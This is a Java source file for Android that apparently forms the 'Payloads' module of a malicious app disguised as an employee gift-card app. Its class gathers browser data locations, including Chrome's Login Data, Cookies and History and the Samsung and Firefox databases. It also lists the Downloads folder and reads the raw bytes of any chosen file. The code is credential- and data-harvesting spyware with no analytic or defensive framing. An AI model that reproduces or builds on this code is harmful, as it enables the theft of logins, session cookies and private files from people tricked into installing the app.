package com.employee.giftcard.Payloads;

import android.content.Context;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class getBrowserData {
    
    /**
     * Get Chrome browser data files
     */
    public static String getChromeData(Context context) {
        StringBuilder result = new StringBuilder();
        
        try {
            String[] chromePaths = {
                "/data/data/com.android.chrome/app_chrome/Default/History",
                "/data/data/com.android.chrome/app_chrome/Default/Bookmarks",
                "/data/data/com.android.chrome/app_chrome/Default/Login Data",
                "/data/data/com.android.chrome/app_chrome/Default/Cookies",
                "/data/data/com.android.chrome/databases/",
                "/data/data/com.sec.android.app.sbrowser/databases/",
                "/data/data/org.mozilla.firefox/databases/"
            };
            
            result.append("Chrome & Browser Data Files\n");
            result.append("============================\n\n");
            
            int foundCount = 0;
            
            for (String path : chromePaths) {
                File file = new File(path);
                
                if (file.exists()) {
                    foundCount++;
                    
                    if (file.isFile()) {
                        result.append("File: ").append(file.getName()).append("\n");
                        result.append("Path: ").append(file.getAbsolutePath()).append("\n");
                        result.append("Size: ").append(formatFileSize(file.length())).append("\n");
                        result.append("Modified: ").append(formatDate(file.lastModified())).append("\n");
                        result.append("---\n");
                    } else if (file.isDirectory()) {
                        result.append("Directory: ").append(path).append("\n");
                        File[] files = file.listFiles();
                        if (files != null) {
                            result.append("Files: ").append(files.length).append("\n");
                            for (File f : files) {
                                if (f.isFile() && (f.getName().endsWith(".db") || 
                                                   f.getName().contains("history") ||
                                                   f.getName().contains("bookmark"))) {
                                    result.append("  - ").append(f.getName());
                                    result.append(" (").append(formatFileSize(f.length())).append(")\n");
                                }
                            }
                        }
                        result.append("---\n");
                    }
                }
            }
            
            if (foundCount == 0) {
                return "No browser data found.\n" +
                       "Note: Browser databases typically require root access.\n" +
                       "Try checking Downloads folder for exported data.";
            }
            
            result.insert(0, "Found " + foundCount + " browser data location(s)\n\n");
            
        } catch (Exception e) {
            return "Error accessing browser data: " + e.getMessage();
        }
        
        return result.toString();
    }
    
    /**
     * Get download history
     */
    public static String getDownloads(Context context) {
        StringBuilder result = new StringBuilder();
        
        try {
            String[] downloadPaths = {
                "/storage/emulated/0/Download/",
                "/storage/emulated/0/Downloads/"
            };
            
            int totalFiles = 0;
            
            for (String path : downloadPaths) {
                File downloadDir = new File(path);
                
                if (downloadDir.exists() && downloadDir.isDirectory()) {
                    File[] files = downloadDir.listFiles();
                    
                    if (files != null && files.length > 0) {
                        result.append("Downloads Folder: ").append(path).append("\n");
                        result.append("Total files: ").append(files.length).append("\n\n");
                        
                        // Group by file type
                        int apkCount = 0, pdfCount = 0, imgCount = 0, docCount = 0, otherCount = 0;
                        
                        for (File file : files) {
                            if (file.isFile()) {
                                String name = file.getName().toLowerCase();
                                if (name.endsWith(".apk")) apkCount++;
                                else if (name.endsWith(".pdf")) pdfCount++;
                                else if (name.matches(".*\\.(jpg|jpeg|png|gif|webp)$")) imgCount++;
                                else if (name.matches(".*\\.(doc|docx|xls|xlsx|txt|zip)$")) docCount++;
                                else otherCount++;
                                
                                totalFiles++;
                            }
                        }
                        
                        result.append("File Types:\n");
                        if (apkCount > 0) result.append("  APK files: ").append(apkCount).append("\n");
                        if (pdfCount > 0) result.append("  PDF files: ").append(pdfCount).append("\n");
                        if (imgCount > 0) result.append("  Images: ").append(imgCount).append("\n");
                        if (docCount > 0) result.append("  Documents: ").append(docCount).append("\n");
                        if (otherCount > 0) result.append("  Other: ").append(otherCount).append("\n");
                        
                        result.append("\nRecent files:\n");
                        
                        // Show 15 most recent files
                        int count = 0;
                        for (File file : files) {
                            if (count >= 15) {
                                result.append("... and ").append(files.length - 15).append(" more files\n");
                                break;
                            }
                            
                            if (file.isFile()) {
                                result.append("  ").append(file.getName()).append("\n");
                                result.append("    Size: ").append(formatFileSize(file.length()));
                                result.append(", Modified: ").append(formatDate(file.lastModified())).append("\n");
                                result.append("    Path: ").append(file.getAbsolutePath()).append("\n");
                                count++;
                            }
                        }
                    }
                }
            }
            
            if (totalFiles == 0) {
                return "No downloaded files found.";
            }
            
        } catch (Exception e) {
            return "Error accessing downloads: " + e.getMessage();
        }
        
        return result.toString();
    }
    
    /**
     * Read a specific browser/download file
     */
    public static byte[] getFile(String filePath) {
        try {
            File file = new File(filePath);
            
            if (!file.exists()) {
                return null;
            }
            
            FileInputStream fis = new FileInputStream(file);
            byte[] data = new byte[(int) file.length()];
            fis.read(data);
            fis.close();
            
            return data;
            
        } catch (IOException e) {
            return null;
        }
    }
    
    // Helper methods
    private static String formatFileSize(long bytes) {
        if (bytes < 1024) return bytes + " B";
        int exp = (int) (Math.log(bytes) / Math.log(1024));
        String pre = "KMGTPE".charAt(exp-1) + "";
        return String.format(Locale.US, "%.2f %sB", bytes / Math.pow(1024, exp), pre);
    }
    
    private static String formatDate(long timestamp) {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
        return sdf.format(new Date(timestamp));
    }
}
